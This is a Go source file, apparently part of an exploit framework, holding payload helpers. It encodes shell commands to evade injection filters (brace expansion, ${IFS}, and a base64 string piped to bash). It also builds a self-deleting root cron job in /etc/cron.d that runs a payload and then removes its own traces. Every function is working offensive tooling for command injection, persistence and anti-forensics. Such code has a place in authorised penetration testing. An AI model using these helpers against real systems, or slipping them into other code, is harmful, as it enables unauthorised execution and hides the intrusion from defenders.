package payload

import (
	b64 "encoding/base64"
	"fmt"
	"regexp"
)

func EncodeCommandBrace(cmd string) string {
	escaped := regexp.MustCompile(`([{,}])`).ReplaceAllString(cmd, `\$1`)

	return "{" + regexp.MustCompile(`\s+`).ReplaceAllString(escaped, ",") + "}"
}

func EncodeCommandIFS(cmd string) string {
	return regexp.MustCompile(`\s+`).ReplaceAllLiteralString(cmd, "${IFS}")
}

// Base64 encodes the command. Wraps it in logic to base64 decode and pipe to bash.
func EncodeEchoBase64ToBash(cmd string) string {
	cmd64 := b64.StdEncoding.EncodeToString([]byte(cmd))

	return fmt.Sprintf("echo %s|base64 -d|bash", cmd64)
}

// Creates two strings that can be used for gaining execution via "/etc/cron.d". The first return ("cron")
// should be uploaded to "cronPath" (presumably /etc/cron.d but I don't know your life), and the second
// return should be uploaded to "xploitPath" (e.g. /tmp/helloworld). The cron file will trigger
// execution of the bash script which will delete both the cron and itself. Example usage:
//
//	cronPath := fmt.Sprintf("/etc/cron.d/%s", random.RandLetters(8))
//	xploitPath := fmt.Sprintf("/tmp/%s", random.RandLetters(8))
//	xploit, ok := generatePayload(conf)
//	if !ok {
//	    return false
//	}
//	cron, xploit := SelfRemovingCron("root", cronPath, xploitPath, xploit)
func SelfRemovingCron(user string, cronPath string, xploitPath string, payload string) (string, string) {
	cron := fmt.Sprintf(`* * * * * %s /bin/sh %s\n`, user, xploitPath)
	xploit := fmt.Sprintf("#!/bin/sh\n\nrm -f %s\nrm -f %s\n%s\n", cronPath, xploitPath, payload)

	return cron, xploit
}
